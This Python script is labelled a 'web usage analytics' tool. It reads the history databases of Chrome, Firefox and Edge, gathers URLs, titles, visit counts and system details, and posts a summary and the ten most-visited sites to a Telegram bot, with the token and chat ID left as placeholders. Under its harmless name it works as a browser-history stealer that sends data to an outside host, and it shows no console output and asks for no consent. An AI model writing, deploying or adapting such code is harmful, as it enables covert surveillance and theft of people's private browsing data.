import sqlite3
import os
import sys
import csv
import json
import logging
from datetime import datetime
import requests
import platform

def setup_logging():
    log_filename = f"web_usage_audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_filename),
            logging.NullHandler()
        ]
    )
    return log_filename

def get_system_info():
    return {
        'platform': platform.system(),
        'architecture': platform.architecture()[0],
        'version': platform.version(),
        'machine': platform.machine()
    }

def is_windows():
    return sys.platform.startswith('win')

def get_appdata_path():
    if is_windows():
        return os.path.expanduser('~\\AppData')
    return None

def get_localappdata_path():
    if is_windows():
        return os.path.expanduser('~\\AppData\\Local')
    return None

def get_roamingappdata_path():
    if is_windows():
        return os.path.expanduser('~\\AppData\\Roaming')
    return None

class WebUsageAnalyticsTool:
    def __init__(self, telegram_token=None, telegram_chat_id=None):
        self.logger = logging.getLogger(__name__)
        self.results = []
        self.browser_paths = self._get_browser_paths()
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.system_info = get_system_info()
        self.logger.info(f"System info: {self.system_info}")
        
    def _get_browser_paths(self):
        paths = {}
        
        if is_windows():
            local_appdata = get_localappdata_path()
            if local_appdata:
                paths['chrome'] = os.path.join(local_appdata, 'Google\\Chrome\\User Data\\Default\\History')
            else:
                paths['chrome'] = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History')
        elif sys.platform.startswith('darwin'):
            paths['chrome'] = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History')
        else:
            paths['chrome'] = os.path.expanduser('~/.config/google-chrome/Default/History')
        
        if is_windows():
            roaming_appdata = get_roamingappdata_path()
            if roaming_appdata:
                firefox_base = os.path.join(roaming_appdata, 'Mozilla\\Firefox\\Profiles')
            else:
                firefox_base = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
        elif sys.platform.startswith('darwin'):
            firefox_base = os.path.expanduser('~/Library/Application Support/Firefox/Profiles')
        else:
            firefox_base = os.path.expanduser('~/.mozilla/firefox')
        
        paths['firefox'] = None
        if os.path.exists(firefox_base):
            for profile_dir in os.listdir(firefox_base):
                if profile_dir.endswith('.default') or profile_dir.endswith('.default-release'):
                    paths['firefox'] = os.path.join(firefox_base, profile_dir, 'places.sqlite')
                    break
        
        if is_windows():
            local_appdata = get_localappdata_path()
            if local_appdata:
                paths['edge'] = os.path.join(local_appdata, 'Microsoft\\Edge\\User Data\\Default\\History')
            else:
                paths['edge'] = os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History')
        elif sys.platform.startswith('darwin'):
            paths['edge'] = os.path.expanduser('~/Library/Application Support/Microsoft Edge/Default/History')
        else:
            paths['edge'] = os.path.expanduser('~/.config/microsoft-edge/Default/History')
        
        return paths
    
    def _safe_connect_db(self, db_path):
        if not os.path.exists(db_path):
            self.logger.warning(f"Database not found: {db_path}")
            return None
        
        try:
            conn = sqlite3.connect(f'file:{db_path}?mode=ro', uri=True)
            return conn
        except sqlite3.OperationalError as e:
            self.logger.error(f"Database locked or inaccessible: {e}")
            return None
        except Exception as e:
            self.logger.error(f"Error connecting to database: {e}")
            return None
    
    def _read_chrome_history(self, db_path):
        conn = self._safe_connect_db(db_path)
        if not conn:
            return []
        
        try:
            cursor = conn.cursor()
            query = """
            SELECT url, title, visit_count, last_visit_time 
            FROM urls 
            ORDER BY last_visit_time DESC 
            LIMIT 1000
            """
            cursor.execute(query)
            results = cursor.fetchall()
            conn.close()
            self.logger.info(f"Retrieved {len(results)} Chrome/Edge history entries")
            return results
        except Exception as e:
            self.logger.error(f"Error reading Chrome/Edge history: {e}")
            conn.close()
            return []
    
    def _read_firefox_history(self, db_path):
        conn = self._safe_connect_db(db_path)
        if not conn:
            return []
        
        try:
            cursor = conn.cursor()
            query = """
            SELECT moz_places.url, moz_places.title, moz_places.visit_count, moz_places.last_visit_date 
            FROM moz_places 
            WHERE moz_places.visit_count > 0 
            ORDER BY moz_places.last_visit_date DESC 
            LIMIT 1000
            """
            cursor.execute(query)
            results = cursor.fetchall()
            conn.close()
            self.logger.info(f"Retrieved {len(results)} Firefox history entries")
            return results
        except Exception as e:
            self.logger.error(f"Error reading Firefox history: {e}")
            conn.close()
            return []
    
    def _convert_chrome_timestamp(self, microseconds):
        chrome_epoch = datetime(1601, 1, 1).timestamp()
        unix_timestamp = chrome_epoch + (microseconds / 1000000.0)
        return datetime.fromtimestamp(unix_timestamp)
    
    def _convert_firefox_timestamp(self, microseconds):
        unix_timestamp = microseconds / 1000000.0
        return datetime.fromtimestamp(unix_timestamp)
    
    def extract_all_browsers(self):
        self.logger.info("Starting web usage analytics collection...")
        
        if self.browser_paths['chrome'] and os.path.exists(self.browser_paths['chrome']):
            self.logger.info("Processing Chrome history...")
            chrome_data = self._read_chrome_history(self.browser_paths['chrome'])
            for url, title, count, timestamp in chrome_data:
                readable_time = self._convert_chrome_timestamp(timestamp)
                self.results.append({
                    'browser': 'Chrome',
                    'url': url,
                    'title': title,
                    'visit_count': count,
                    'timestamp': readable_time.isoformat()
                })
        
        if self.browser_paths['firefox'] and os.path.exists(self.browser_paths['firefox']):
            self.logger.info("Processing Firefox history...")
            firefox_data = self._read_firefox_history(self.browser_paths['firefox'])
            for url, title, count, timestamp in firefox_data:
                readable_time = self._convert_firefox_timestamp(timestamp)
                self.results.append({
                    'browser': 'Firefox',
                    'url': url,
                    'title': title,
                    'visit_count': count,
                    'timestamp': readable_time.isoformat()
                })
        
        if self.browser_paths['edge'] and os.path.exists(self.browser_paths['edge']):
            self.logger.info("Processing Edge history...")
            edge_data = self._read_chrome_history(self.browser_paths['edge'])
            for url, title, count, timestamp in edge_data:
                readable_time = self._convert_chrome_timestamp(timestamp)
                self.results.append({
                    'browser': 'Edge',
                    'url': url,
                    'title': title,
                    'visit_count': count,
                    'timestamp': readable_time.isoformat()
                })
        
        self.logger.info(f"Collection complete. Found {len(self.results)} total entries")
        return self.results
    
    def export_to_csv(self, filename=None):
        if not filename:
            filename = f"web_usage_analytics_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        
        with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
            fieldnames = ['browser', 'url', 'title', 'visit_count', 'timestamp']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            for row in self.results:
                writer.writerow(row)
        
        self.logger.info(f"Exported {len(self.results)} records to {filename}")
        return filename
    
    def export_to_json(self, filename=None):
        if not filename:
            filename = f"web_usage_analytics_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w', encoding='utf-8') as jsonfile:
            json.dump(self.results, jsonfile, indent=2, ensure_ascii=False)
        
        self.logger.info(f"Exported {len(self.results)} records to {filename}")
        return filename
    
    def send_to_telegram(self, message):
        if not self.telegram_token or not self.telegram_chat_id:
            self.logger.warning("Telegram token or chat ID not provided")
            return False
        
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            payload = {
                'chat_id': self.telegram_chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=payload)
            if response.status_code == 200:
                self.logger.info("Successfully sent message to Telegram")
                return True
            else:
                self.logger.error(f"Failed to send to Telegram: {response.text}")
                return False
        except Exception as e:
            self.logger.error(f"Error sending to Telegram: {e}")
            return False
    
    def send_results_to_telegram(self):
        if not self.results:
            self.send_to_telegram("No browser history found or accessible")
            return
        
        browsers = {}
        total_entries = len(self.results)
        total_visits = sum(item['visit_count'] for item in self.results)
        
        for item in self.results:
            browser = item['browser']
            if browser not in browsers:
                browsers[browser] = 0
            browsers[browser] += 1
        
        summary_msg = f"""📊 <b>Web Usage Analytics Report</b>

📈 <b>Summary:</b>
• Total entries: {total_entries}
• Total visits: {total_visits}
• Browsers found: {', '.join(browsers.keys())}

📊 <b>By Browser:</b>
"""
        for browser, count in browsers.items():
            summary_msg += f"• {browser}: {count} entries\n"
        
        summary_msg += f"\n⏰ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        summary_msg += f"\n🖥️ System: {self.system_info['platform']} {self.system_info['architecture']}"

        self.send_to_telegram(summary_msg)
        
        sorted_results = sorted(self.results, key=lambda x: x['visit_count'], reverse=True)
        top_10_msg = "<b>Top 10 Most Visited Sites:</b>\n\n"
        for i, item in enumerate(sorted_results[:10]):
            top_10_msg += f"{i+1}. <a href='{item['url']}'>{item['title']}</a>\n"
            top_10_msg += f"   Visits: {item['visit_count']}, Time: {item['timestamp']}\n\n"
        
        self.send_to_telegram(top_10_msg)
    
    def generate_summary_report(self):
        if not self.results:
            return {"error": "No data collected"}
        
        browsers = {}
        total_visits = 0
        urls_by_browser = {}
        
        for entry in self.results:
            browser = entry['browser']
            if browser not in browsers:
                browsers[browser] = 0
                urls_by_browser[browser] = set()
            
            browsers[browser] += 1
            urls_by_browser[browser].add(entry['url'])
            total_visits += entry['visit_count']
        
        summary = {
            "total_entries": len(self.results),
            "total_visits": total_visits,
            "browsers_found": browsers,
            "unique_urls_per_browser": {k: len(v) for k, v in urls_by_browser.items()},
            "collection_timestamp": datetime.now().isoformat(),
            "system_info": self.system_info
        }
        
        return summary

def main():
    log_file = setup_logging()
    logger = logging.getLogger(__name__)
    
    logger.info("="*60)
    logger.info("WEB USAGE ANALYTICS TOOL STARTED")
    logger.info("="*60)
    
    system_info = get_system_info()
    logger.info(f"Running on {system_info['platform']} {system_info['architecture']}")
    
    TELEGRAM_TOKEN = "YOUR_BOT_TOKEN_HERE"
    TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
    
    try:
        tool = WebUsageAnalyticsTool(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)
        results = tool.extract_all_browsers()
        
        if results:
            csv_file = tool.export_to_csv()
            json_file = tool.export_to_json()
            summary = tool.generate_summary_report()
            summary_file = f"analytics_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(summary_file, 'w', encoding='utf-8') as f:
                json.dump(summary, f, indent=2)
            
            tool.send_results_to_telegram()
            
            logger.info("Web usage analytics completed successfully")
            logger.info(f"Results: {summary['total_entries']} entries from {len(summary['browsers_found'])} browsers")
            
            return True
        else:
            logger.warning("No browser history found or accessible")
            return False
    
    except Exception as e:
        logger.error(f"Critical error in main execution: {e}")
        return False

if __name__ == "__main__":
    main()
